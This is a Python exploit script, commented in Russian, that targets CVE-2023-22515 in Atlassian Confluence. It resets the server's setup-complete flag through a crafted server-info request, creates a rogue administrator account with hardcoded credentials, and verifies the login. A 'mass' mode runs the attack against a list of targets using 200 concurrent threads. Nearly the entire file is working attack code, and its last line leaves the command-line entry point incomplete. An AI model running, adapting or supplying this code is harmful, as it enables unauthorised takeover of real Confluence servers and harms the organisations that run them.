# Импорт необходимых модулей
import json
import fire
import requests
from rich import print
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor

# Установка заголовков HTTP для запросов
HEADERS = {
    "X-Atlassian-Token": "no-check",
    "User-Agent": "Mozilla/5.0 (PlayStation 4 7.02) AppleWebKit/605.1.15 (KHTML, like Gecko)"
}

# Отключение предупреждений от библиотеки urllib3
requests.packages.urllib3.disable_warnings()

# Определение класса Confluence для работы с Confluence
class Confluence:
    def __init__(self, base_url, verbose=False):
        self.base_url = base_url
        self.verbose = verbose
        self.username = "pleasepatch"
        self.password = "Password2"

    def send_request(self, method, url, auth=None, data=None):
        try:
            # Отправка HTTP-запроса с использованием библиотеки requests
            response = requests.request(method, url, headers=HEADERS, verify=False, timeout=3, auth=auth, data=data)
            return response.status_code, response.text
        except requests.exceptions.RequestException as e:
            if self.verbose:
                # Обработка ошибки запроса и вывод сообщения об ошибке
                print(f"[[bold red]ERROR[/bold red]] Request error for {url}: {str(e)}", style="red")
            return None, None

    def check_authentication(self):
        # Проверка аутентификации и получение сведений о пользователе.
        auth = (self.username, self.password)
        url = f"{self.base_url}/rest/api/user?username={self.username}"
        status, response = self.send_request("GET", url, auth=auth)
        
        if status == 200:
            try:
                # Разбор JSON-ответа и вывод информации о пользователе
                user_info = json.loads(response.strip())
                formatted_user_info = json.dumps(user_info, indent=2)
                if self.verbose:
                    print(f"[bold green][*][bold white] Authenticated as \"{self.username}\" user\n")
                    print(f"[[bold yellow]INFO[/bold yellow]]  User Information: [white]{formatted_user_info}")
            except json.JSONDecodeError:
                return False
            return True
        else:
            if self.verbose:
                # Вывод сообщения об ошибке аутентификации
                print(f"[bold red][-][/bold red] Authentication failed for {self.username}")
            return False

    def exploit(self):
        success_message = None

        if not self.trigger_vulnerability():
            error_message = f"[bold red][-][/bold red] Failed to trigger vulnerability for {self.base_url}"
        elif not self.create_admin_account():
            error_message = f"[bold red][-][/bold red] Failed to create a new administrator for {self.base_url}"
        elif self.check_authentication():
            success_message = f"[bold green][*][bold white] Successfully exploited {self.base_url} and logged in as admin!"
        else:
            error_message = f"[bold red][-][/bold red] Failed to authenticate with created admin account at {self.base_url}"

        if success_message:
            if not self.verbose:
                print(success_message)
            return success_message
        else:
            return error_message

    def trigger_vulnerability(self):
        # Попытка вызвать уязвимость, отправив определенный запрос
        status, _ = self.send_request("GET", f"{self.base_url}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false")
        return status == 200

    def create_admin_account(self):
        data = {
            "username": self.username,
            "fullName": self.username,
            "email": f"{self.username}@localhost",
            "password": self.password,
            "confirm": self.password,
            "setup-next-button": "Next"
        }

        # Попытка создать нового администратора
        status, response = self.send_request("POST", f"{self.base_url}/setup/setupadministrator.action", data=data)
        if self.verbose:
            if status == 200:
                print(f"[[bold yellow]INFO[/bold yellow]] Username: {self.username}")
                print(f"[[bold yellow]INFO[/bold yellow]] Password: {self.password}")
                if "Setup Successful" in response:
                    print("[bold green][*][bold white] Created new administrator successfully")
                elif "A user with this username already exists" in response:
                    print("[bold yellow][!][bold white] Administrator with this username already exists")
            else:
                print("[bold red][-][/bold red] Failed to create a new administrator for {self.base_url}")
                if response:
                    print(f"[[bold yellow]INFO[/bold yellow]] Error response: {response}")    

        return status == 200

# Функция для эксплуатации цели
def exploit_target(url, bar=None, verbose=False):
    result = Confluence(url, verbose=verbose).exploit()
    if bar:
        bar()

# Функция для сканирования списка целей
def scan_targets(targets, verbose=False):
    with alive_bar(len(targets), enrich_print=False) as bar:
        with ThreadPoolExecutor(max_workers=200) as executor:
            results = list(executor.map(lambda url: exploit_target(url, bar, verbose), targets))
            
# Класс Exploit для управления эксплуатацией уязвимости
class Exploit:
    """
    Exploit script for CVE-2023-22515 - Confluence Vulnerability.
    
    This script attempts to exploit the CVE-2023-22515 vulnerability in Confluence
    to gain unauthorized access.
    """
    def __init__(self):
        self.verbose = False  

    def normal(self, target):
        """
        Exploits the Confluence vulnerability using a single target URL.
        
        Args:
            target (str): The target URL to exploit.
        """
        self.verbose = True
        exploit_target(target, verbose=self.verbose)
    
    def mass(self, filename):
        """
        Exploits the Confluence vulnerability using a list of target URLs from a file.
        
        Args:
            filename (str): The name of the file containing a list of target URLs.
        """
        with open(filename, 'r') as file:
            targets = [line.strip() for line in file.readlines() if line.strip()]
        scan_targets(targets, verbose=self.verbose)
            
if __name__ == "__main__":
    # Запуск сценария с использованием библиотеки Fire для создания командной строки
    fire
